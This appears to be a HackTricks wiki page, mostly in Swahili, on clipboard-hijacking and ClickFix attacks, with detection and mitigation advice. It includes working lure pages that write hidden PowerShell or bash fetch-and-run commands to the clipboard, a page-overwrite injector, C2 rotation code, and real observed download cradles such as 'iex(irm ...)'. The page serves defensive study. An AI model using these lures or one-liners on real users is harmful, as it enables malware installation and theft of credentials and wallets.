# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – ushauri wa zamani lakini bado ni sahihi

## Muhtasari

Clipboard hijacking – pia inajulikana kama *pastejacking* – hutumia ukweli kwamba watumiaji mara kwa mara hunakili-na-kubandika amri bila kuzikagua. Ukurasa wa wavuti wenye nia mbaya (au mazingira yoyote yanayoweza kutumia JavaScript kama vile Electron au Desktop application) huweka kwa njia ya programu maandishi yanayodhibitiwa na mshambuliaji kwenye system clipboard. Waathiriwa huhimizwa, kwa kawaida kupitia maagizo ya social-engineering yaliyotengenezwa kwa uangalifu, kubonyeza **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), au kufungua terminal na *kubandika* maudhui ya clipboard, hivyo kuendesha mara moja amri zozote.

Kwa kuwa **hakuna file inapakuliwa na hakuna attachment inayofunguliwa**, mbinu hii hupita udhibiti mwingi wa usalama wa e-mail na web-content unaofuatilia attachments, macros au direct command execution. Hivyo, shambulio hili ni maarufu katika phishing campaigns zinazowasilisha malware za kawaida kama vile NetSupport RAT, Latrodectus loader au Lumma Stealer.

## Wallet-address replacement clippers

Aina nyingine ya **clipboard hijacking** hai-bandiki amri kabisa: inasubiri hadi mwathiriwa anaponakili **cryptocurrency wallet address**, kisha kwa kimya hubadilisha na ile inayodhibitiwa na mshambuliaji muda mfupi kabla ya paste. Hii ni hasa yenye ufanisi dhidi ya fomati ndefu za wallet kwa sababu watumiaji mara nyingi huthibitisha tu herufi za mwanzo/mwisho.

Sifa za kawaida za ulimwengu halisi:
- **Thin loader + nested payload**: app/exe inayoonekana inaonekana kama tool halali ya trading au "profit", ilhali clipper halisi imefichwa zaidi ndani ya bundle (kwa mfano .NET loader inayoanzisha nested Rust payload).
- **Regex-driven replacement**: malware hulinganisha strings kama `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, au hata generic **44-character Solana-like** strings na kuzibadilisha kuwa attacker wallets.
- **Wallet rotation at scale**: sampuli za kisasa za Windows zinaweza kupachika **maelfu** ya replacement wallets kwa kila currency badala ya anwani moja tuli, hivyo kupunguza wallet reputation burn baada ya kila wizi.

### Windows clipper flow

Utekelezaji wa kawaida ni hidden window iliyosajiliwa kwa **`AddClipboardFormatListener`**. Kwenye kila clipboard update, malware kwa kawaida huita:
- **`OpenClipboard`** → kufikia data ya sasa ya clipboard.
- **`GetClipboardData`** → kusoma text.
- **`EmptyClipboard`** + **`SetClipboardData`** → kubadilisha string ya wallet na value ya mshambuliaji.

Minimal hunting regexes mara nyingi huonekana kwenye clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kudumu kwa kiwango cha mtumiaji kunatosha kwa athari. Muundo mmoja ulioonekana ni:
- Nakili payload hadi **`%APPDATA%\silke\silke.exe`**
- Unda **Startup-folder LNK** chini ya `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Mawazo ya detection:
- Processes zinazopiga clipboard APIs kwa mfululizo huku pia zikiandika chini ya `%APPDATA%` na folda ya mtumiaji ya **Startup**.
- Uundaji mpya wa LNK/executable ukifuatiwa na rewrites za clipboard za wallet-address.
- Archives au fake-software bundles zenye files nyingi zisizotumiwa pamoja na launcher ndogo inayoanzisha nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Kwenye macOS, baadhi ya campaigns husafirisha helper ya **`unlocker.command`** na kumwagiza mwathiriwa kubofya kulia → **Open** ikiwa Gatekeeper inasema app imeharibika au imetoka kwa unidentified developer. Script kwa urahisi huondoa quarantine na kuanzisha `.app` iliyo karibu:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Hii si **Gatekeeper exploit**; ni **social-engineered quarantine bypass** ambayo inatumia ukweli kwamba maamuzi ya Gatekeeper hutegemea `com.apple.quarantine` xattr.

Baada ya utekelezaji, clipper inaweza kuendelea kuwepo kama mtumiaji wa sasa kwa kuandika:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent yenye `RunAtLoad` na `KeepAlive`

Kipengele muhimu cha ulinzi ni kwamba baadhi ya sampuli hutekeleza **self-healing watchdog** ambayo huandika upya LaunchAgent na wrapper kila baada ya ~30 sekunde. Ukiondoa plist kwanza **bila kuua process inayoendelea**, malware inaweza kuirudisha mara moja. Mpangilio salama wa kusafisha:
1. Uue active clipper process.
2. Ondoa `LaunchAgent` plist.
3. Futa `~/launch.sh` na payload iliyonakiliwa.

### Delivery note: fake reputation as a force multiplier

Kwa familia hii, malware yenyewe inaweza kubaki rahisi kiufundi wakati **distribution layer** inafanya kazi kubwa: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, na VirusTotal comments/votes zinazoonekana kuwa za kawaida hutumika kuifanya binary ionekane ya kuaminika kabla ya utekelezaji.

## Forced copy buttons and hidden payloads (macOS one-liners)

Baadhi ya macOS infostealers huiga tovuti za installer (k.m., Homebrew) na **kulazimisha matumizi ya “Copy” button** ili watumiaji wasiweze ku-highlight tu maandishi yanayoonekana. Kitu cha clipboard kina command ya installer inayotarajiwa pamoja na Base64 payload iliyoongezwa (k.m., `...; echo <b64> | base64 -d | sh`), hivyo paste moja tu hutekeleza vyote viwili wakati UI inaficha stage ya ziada.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Kampeni za zamani zilitumia `document.execCommand('copy')`, na zile za sasa zinategemea **Clipboard API** ya async (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Mtumiaji anatembelea tovuti iliyotyposquat au iliyoharibiwa (mfano `docusign.sa[.]com`)
2. JavaScript ya **ClearFake** iliyoingizwa huita helper `unsecuredCopyToClipboard()` ambayo kwa siri huhifadhi one-liner ya PowerShell iliyosimbwa kwa Base64 kwenye clipboard.
3. Maelekezo ya HTML humwambia mwathiriwa: *“Bonyeza **Win + R**, bandika command na ubonyeze Enter ili kutatua issue.”*
4. `powershell.exe` hutekelezwa, ikipakua archive ambayo ina executable halali pamoja na DLL ya kihalifu (classic DLL sideloading).
5. Loader hufungua kwa decryption stages za ziada, huingiza shellcode na kusakinisha persistence (mfano scheduled task) – hatimaye ikiendesha NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (halali Java WebStart) hutafuta `msvcp140.dll` kwenye saraka yake.
* DLL hasidi hutatua APIs kwa nguvu kwa **GetProcAddress**, hupakua binaries mbili (`data_3.bin`, `data_4.bin`) kupitia **curl.exe**, huzisimbua kwa kutumia rolling XOR key `"https://google.com/"`, huingiza shellcode ya mwisho na hufungua **client32.exe** (NetSupport RAT) hadi `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Hupakua `la.txt` kwa **curl.exe**
2. Huendesha JScript downloader ndani ya **cscript.exe**
3. Huchukua MSI payload → huweka `libcef.dll` kando ya application iliyosainiwa → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call inazindua script ya PowerShell iliyofichwa ambayo hupakua `PartyContinued.exe`, hutoa `Boat.pst` (CAB), hujenga upya `AutoIt3.exe` kupitia `extrac32` na kuunganisha faili, na hatimaye huendesha script ya `.a3x` ambayo hutoa kwa siri kredenshiali za kivinjari kwenda `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Baadhi ya kampeni za ClickFix huruka kabisa upakuaji wa faili na huwaagiza waathiriwa kubandika one-liner ambayo hupata na kutekeleza JavaScript kupitia WSH, huiweka persist, na kuzungusha C2 kila siku. Mnyororo wa mfano ulioonekana:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Sifa kuu
- URL iliyofichwa na kubadilishwa nyuma wakati wa runtime ili kushinda ukaguzi wa kawaida.
- JavaScript hujifanya ya kudumu kupitia Startup LNK (WScript/CScript), na huchagua C2 kulingana na siku ya sasa – kuwezesha mzunguko wa haraka wa domain.

Sehemu ndogo ya JS inayotumika kuzungusha C2s kwa tarehe:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command-line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily-rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Kampeni za hivi karibuni huzalisha kwa wingi kurasa bandia za uthibitishaji za CDN/kivinjari ("Just a moment…", mtindo wa IUAM) ambazo hulazimisha watumiaji kunakili amri mahususi za OS kutoka kwenye clipboard yao kwenda kwenye koni asilia. Hii huhamisha utekelezaji nje ya sandbox ya kivinjari na hufanya kazi kwenye Windows na macOS.

Sifa kuu za kurasa zinazozalishwa na builder
- Utambuzi wa OS kupitia `navigator.userAgent` ili kulenga payloads (Windows PowerShell/CMD dhidi ya Terminal ya macOS). Decoy/ no-ops za hiari kwa OS zisizotumika ili kudumisha udanganyifu.
- Kunakili kiotomatiki kwenye clipboard kupitia vitendo visivyo na madhara vya UI (checkbox/Copy) wakati maandishi yanayoonekana yanaweza kutofautiana na yaliyomo kwenye clipboard.
- Kuzuia mobile na popover yenye maagizo ya hatua kwa hatua: Windows → Win+R→paste→Enter; macOS → fungua Terminal→paste→Enter.
- Obfuscation ya hiari na injector ya faili moja ili kubadilisha DOM ya tovuti iliyoathiriwa kwa UI ya uthibitishaji yenye mtindo wa Tailwind (hakuna usajili mpya wa domain unaohitajika).

Mfano: kutolingana kwa clipboard + branching inayojali OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Uendelevu wa macOS wa uendeshaji wa awali
- Tumia `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ili utekelezaji uendelee baada ya terminal kufungwa, kupunguza mabaki yanayoonekana.

Uchukuaji wa ukurasa kwa njia ya in-place kwenye tovuti zilizoathiriwa
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Mawazo ya ugunduzi na uwindaji mahususi kwa IUAM-style lures
- Web: Kurasa zinazofunga Clipboard API kwenye verification widgets; kutokulingana kati ya maandishi yanayoonyeshwa na clipboard payload; mgawanyiko wa `navigator.userAgent`; Tailwind + single-page replace katika muktadha wa kutiliwa shaka.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` muda mfupi baada ya mwingiliano wa browser; batch/MSI installers zinazotekelezwa kutoka `%TEMP%`.
- macOS endpoint: Terminal/iTerm ikizalisha `bash`/`curl`/`base64 -d` na `nohup` karibu na matukio ya browser; background jobs zinazoendelea baada ya terminal kufungwa.
- Correlate `RunMRU` Win+R history na clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake inaendelea kuathiri WordPress sites na kuingiza loader JavaScript inayofunga external hosts (Cloudflare Workers, GitHub/jsDelivr) na hata blockchain “etherhiding” calls (kwa mfano, POSTs kwa Binance Smart Chain API endpoints kama `bsc-testnet.drpc[.]org`) ili kuvuta current lure logic. Overlays za hivi karibuni zinatumia sana fake CAPTCHAs zinazoelekeza users kunakili/kubandika one-liner (T1204.004) badala ya kupakua chochote.
- Initial execution inaendelea kukabidhiwa kwa signed script hosts/LOLBAS. Januari 2026 chains zilibadilisha matumizi ya awali ya `mshta` kwa built-in `SyncAppvPublishingServer.vbs` iliyotekelezwa kupitia `WScript.exe`, ikipitisha PowerShell-like arguments zenye aliases/wildcards ili kuchukua remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imesainiwa na kwa kawaida hutumiwa na App-V; ikiwa imeunganishwa na `WScript.exe` na arguments zisizo za kawaida (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) inakuwa hatua ya LOLBAS yenye signal ya juu kwa ClearFake.
- Februari 2026 fake CAPTCHA payloads zilihamia tena kwenye pure PowerShell download cradles. Mifano miwili hai:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Mlolongo wa kwanza ni `iex(irm ...)` grabber ya ndani ya memory; wa pili huendelea kupitia `WinHttp.WinHttpRequest.5.1`, huandika `.ps1` ya muda, kisha huzindua kwa `-ep bypass` kwenye dirisha lililofichwa.

Vidokezo vya detection/hunting kwa variants hizi
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` au PowerShell cradles mara tu baada ya clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, au raw IP `iex(irm ...)` patterns.
- Network: outbound kwenda CDN worker hosts au blockchain RPC endpoints kutoka script hosts/PowerShell muda mfupi baada ya web browsing.
- File/registry: uundaji wa `.ps1` wa muda chini ya `%TEMP%` pamoja na RunMRU entries zenye hizi one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry inaonyesha kuwa indicator thabiti si **kila command moja ileile**, bali mchanganyiko wa **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, na **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: baadhi ya payloads huita `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` kabla ya stage halisi. Hii huthibitisha user interaction huku ikibakiza dirisha fupi na tulivu.
- **Fake verification comments**: PowerShell one-liners zinaweza kuongeza strings kama `# Security check ✔️ I'm not a robot Verification ID: 138105` ili command iendelee kuonekana CAPTCHA-related baada ya kubandikwa kwenye Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` huepuka static URL kwenye command line huku bado ikifanya in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` hutumia unusual casing na Unicode-like characters kwenye flags kuvuruga brittle detections huku bado ikifanana na `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` inaweza kuficha keywords kwa `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), kuanzisha nested shell ikiwa minimized, kuhifadhi content ya mshambulizi kwa extension isiyo na madhara kama `.pdf`, kisha kuit 실행 kupitia `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
